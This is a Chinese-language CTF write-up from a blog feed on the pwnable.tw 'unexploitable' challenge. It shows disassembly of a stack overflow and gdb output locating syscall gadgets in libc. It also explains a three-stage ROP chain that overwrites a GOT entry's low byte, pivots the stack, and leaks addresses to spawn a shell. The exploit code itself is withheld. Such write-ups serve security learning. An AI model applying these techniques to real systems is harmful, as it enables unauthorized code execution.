<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">.text:0000000000400544 ; int __cdecl main(int argc, const char **argv, const char **envp)</div><div class="line">.text:0000000000400544                 public main</div><div class="line">.text:0000000000400544 main            proc near               ; DATA XREF: _start+1Do</div><div class="line">.text:0000000000400544</div><div class="line">.text:0000000000400544 buf             = byte ptr -10h</div><div class="line">.text:0000000000400544</div><div class="line">.text:0000000000400544                 push    rbp</div><div class="line">.text:0000000000400545                 mov     rbp, rsp</div><div class="line">.text:0000000000400548                 sub     rsp, 10h</div><div class="line">.text:000000000040054C                 mov     edi, 3          ; seconds</div><div class="line">.text:0000000000400551                 mov     eax, 0</div><div class="line">.text:0000000000400556                 call    _sleep</div><div class="line">.text:000000000040055B                 lea     rax, [rbp+buf]</div><div class="line">.text:000000000040055F                 mov     edx, 100h       ; nbytes</div><div class="line">.text:0000000000400564                 mov     rsi, rax        ; buf</div><div class="line">.text:0000000000400567                 mov     edi, 0          ; fd</div><div class="line">.text:000000000040056C                 mov     eax, 0</div><div class="line">.text:0000000000400571                 call    _read</div><div class="line">.text:0000000000400576                 leave</div><div class="line">.text:0000000000400577                 retn</div><div class="line">.text:0000000000400577 main            endp</div></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="0x01-思路"><a href="#0x01-思路" class="headerlink" title="0x01 思路"></a>0x01 思路</h2><p>在pwnable.kr上这个题目用ROP和SROP均可以完成，不过有个重要个前提有<code>syscall</code>。这个题目删除了这个gadget，导致题目的难度上升了一个档次。pwnable.kr的writeup在<a href="http://weaponx.site/2017/02/28/unexploitable-Writeup-pwnable-kr/">http://weaponx.site/2017/02/28/unexploitable-Writeup-pwnable-kr/</a></p>
<p>题目给出了libc，看来是让我们用内存泄漏来计算出<code>system/execve</code>等地址来执行<code>system(&quot;/bin/sh&quot;)</code>。通常内存泄漏最终需要调用类似<code>puts\write</code>等打印函数，然而程序中并没有这些函数。只能通过<code>syscall</code>和<code>syscall_id</code>来调用需要的函数，但是又回到的最初没有<code>syscall</code>的情况。</p>
<p>所以只能寻求一个更有创造性的方法。</p>
<h2 id="0x02-寻找syscall"><a href="#0x02-寻找syscall" class="headerlink" title="0x02 寻找syscall"></a>0x02 寻找syscall</h2><p>在libc中搜索<code>\x0f\x0f</code>–<code>syscall</code>的机器码。可以看到在<code>read</code>函数中就有两个gadget。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">gdb-peda$ find <span class="string">"\x0f\x05"</span></div><div class="line">...</div><div class="line">libc.so.6 : 0x7ffff7b0467e (&lt;<span class="built_in">read</span>+14&gt;:  syscall)</div><div class="line">libc.so.6 : 0x7ffff7b0469b (&lt;<span class="built_in">read</span>+43&gt;:  syscall)</div><div class="line">...</div><div class="line"></div><div class="line">gdb-peda$ <span class="built_in">print</span> <span class="built_in">read</span></div><div class="line"><span class="variable">$1</span> = &#123;&lt;text variable, no debug info&gt;&#125; 0x7ffff7b04670 &lt;<span class="built_in">read</span>&gt;</div></pre></td></tr></table></figure>
<p>可以发现<code>read</code>函数中的<code>syscall</code>的距离函数入口的偏移量只有14和43，根据ASLR的原理。可以通过修改GOT表中<code>read</code>函数的LSB(<code>last significant bit</code>,最低有效位)为<code>0x7e</code>或者<code>0x9b</code>就得到了<code>syscall</code>！</p>
<h2 id="0x03-how-to-exploit"><a href="#0x03-how-to-exploit" class="headerlink" title="0x03 how to exploit"></a>0x03 how to exploit</h2><p>第一段payload完成溢出，并调用<code>read</code>将第二段payload写入<code>bss</code>段中，然后利用<code>pop rbp;ret</code>和<code>leave;ret</code>将栈迁移到<code>bss</code>段上。</p>
<p>第二段payload完成修改GOT表中<code>read</code>的LSB，变为<code>syscall</code>。利用<code>syscall</code>调用<code>write</code>泄漏<code>sleep</code>的地址，计算出<code>/bin/sh\x00</code>的地址<code>pop rdi;ret</code>的地址和<code>system</code>的地址。最后将栈迁移到第三段payload上。</p>
<p>第三段payload，将<code>/bin/sh\x00</code>放入<code>rdi</code>寄存器中，完成<code>system(&quot;/bin/sh\x00&quot;)</code>。</p>
<h2 id="0x04-syscall-to-system"><a href="#0x04-syscall-to-system" class="headerlink" title="0x04 syscall to system"></a>0x04 syscall to system</h2><p>通过<code>syscall</code>来调用函数必须要将<code>syscall_id</code>放入<code>rax</code>寄存器中，但是经过搜索并没有设置<code>rax</code>相关的gadgets。必须利用函数的返回值来设置<code>rax</code>。<code>read</code>函数的返回值是读入字符的个数，所以可以通过调用<code>read</code>函数来设置<code>rax</code>的值。</p>
<p>通过写LSB得到<code>syscall</code>后<code>rax</code>的值为1，即可通过<code>syscall</code>调用<code>write</code>来泄漏内存，此时可以通过泄漏内存的字节数来控制<code>rax</code>。<code>sleep</code>的返回值是0，所以可以通过调用<code>sleep</code>来将<code>rax</code>置0调用<code>read</code>。</p>
<p>所以既可以通过偏移计算<code>system</code>的地址，也可以通过<code>syscall</code>和<code>syscall_id = 59</code>来调用<code>execve</code>。</p>
<p>写出exploit后Boom shakalaka！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[+] [sleep base] =&gt; [0x7fb74adbe680]</div><div class="line">[+] [system] =&gt; [0x7fb74ad14102]</div><div class="line">[+] [pop rdi ret] =&gt; [0x7fb74ad38390]</div><div class="line">FINAL!!!</div><div class="line">[*] Switching to interactive mode</div><div class="line">$ cat /home/unexploitable/flag</div><div class="line">FLAG&#123;********************************&#125;</div><div class="line">$</div><div class="line">[*] Interrupted</div><div class="line">[*] Closed connection to chall.pwnable.tw port 10403</div></pre></td></tr></table></figure>
<h2 id="0x05-exploit"><a href="#0x05-exploit" class="headerlink" title="0x05 exploit"></a>0x05 exploit</h2><p>因为主办方不让公开高分的题目，所以exploit提交到主办方的writeup系统中了，<a href="https://pwnable.tw/writeup/20/927" target="_blank" rel="external">https://pwnable.tw/writeup/20/927</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-unexploitable&quot;&gt;&lt;a href=&quot;#0x00-unexploitable&quot; class=&quot;headerlink&quot; title=&quot;0x00 unexploitable&quot;&gt;&lt;/a&gt;0x00 unexploitable&lt;/h2&gt;&lt;p&gt;最近在刷pwnable.tw（类似pwnable.kr，不过是台湾的）的题，看到了一个unexploitable的题目。根据题目描述:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The original challenge is on pwnable.kr and it is solvable.&lt;br&gt;This time we fix the vulnerability and now we promise that the service is unexploitable.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;下载下来后丢到ida看到确实没什么变化，除了pwnable.kr那个题中最重要的一点&lt;code&gt;syscall&lt;/code&gt;没有给。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;.text:0000000000400544 ; int __cdecl main(int argc, const char **argv, const char **envp)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0000000000400544                 public main&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0000000000400544 main            proc near               ; DATA XREF: _start+1Do&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0000000000400544&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0000000000400544 buf             = byte ptr -10h&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0000000000400544&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0000000000400544                 push    rbp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0000000000400545                 mov     rbp, rsp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0000000000400548                 sub     rsp, 10h&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:000000000040054C                 mov     edi, 3          ; seconds&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0000000000400551                 mov     eax, 0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0000000000400556                 call    _sleep&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:000000000040055B                 lea     rax, [rbp+buf]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:000000000040055F                 mov     edx, 100h       ; nbytes&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0000000000400564                 mov     rsi, rax        ; buf&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0000000000400567                 mov     edi, 0          ; fd&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:000000000040056C                 mov     eax, 0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0000000000400571                 call    _read&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0000000000400576                 leave&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0000000000400577                 retn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:0000000000400577 main            endp&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="安全" scheme="http://weaponx.site/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="pwn" scheme="http://weaponx.site/tags/pwn/"/>
    
      <category term="wargame" scheme="http://weaponx.site/tags/wargame/"/>
    
  </entry>
  
</feed>
